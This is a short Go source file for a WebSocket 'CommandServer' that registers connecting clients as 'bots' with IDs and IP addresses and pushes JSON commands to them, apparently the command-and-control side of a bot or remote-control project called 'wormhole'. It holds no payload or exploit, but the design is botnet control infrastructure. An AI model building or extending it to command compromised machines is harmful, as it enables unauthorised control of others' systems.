package server

import (
	"fmt"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"sync"
	"time"
	"wormhole/core"
)

const (
	defaultCommandResultDeadline = 10 * time.Second
)

type Bot struct {
	ID   string
	IP   string
	Conn *websocket.Conn
}

type CommandServer struct {
	*sync.RWMutex
	addr      string
	upgrader  websocket.Upgrader
	bots      map[string]*Bot
	onConnect func(*Bot)
}

func NewCommandServer(addr string) *CommandServer {
	return &CommandServer{
		RWMutex:  new(sync.RWMutex),
		addr:     addr,
		upgrader: websocket.Upgrader{},
		bots:     make(map[string]*Bot),
	}
}

func (s *CommandServer) OnConnect(h func(*Bot)) {
	s.Lock()
	s.onConnect = h
	s.Unlock()
}

func (s *CommandServer) entrypoint(w http.ResponseWriter, r *http.Request) {
	c, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade ws connection error:", err)
		return
	}
	bot := &Bot{
		ID:   uuid.New().String(),
		IP:   r.RemoteAddr,
		Conn: c,
	}
	log.Println("bot connected: ", bot)
	s.Lock()
	s.bots[bot.ID] = bot
	s.Unlock()
	go s.onConnect(bot)
}

func (s *CommandServer) SendCommand(c core.Command, botID string) error {
	s.Lock()
	defer s.Unlock()

	bot, ok := s.bots[botID]
	if !ok {
		return fmt.Errorf("command %s execution error: unknown bot ID %s", c.Name, botID)
	}

	return bot.Conn.WriteJSON(c)
}

func (s *CommandServer) startHeartBeating() {

}

func (s *CommandServer) Run() error {
	http.HandleFunc("/", s.entrypoint)
	s.startHeartBeating()
	return http.ListenAndServe(s.addr, nil)
}
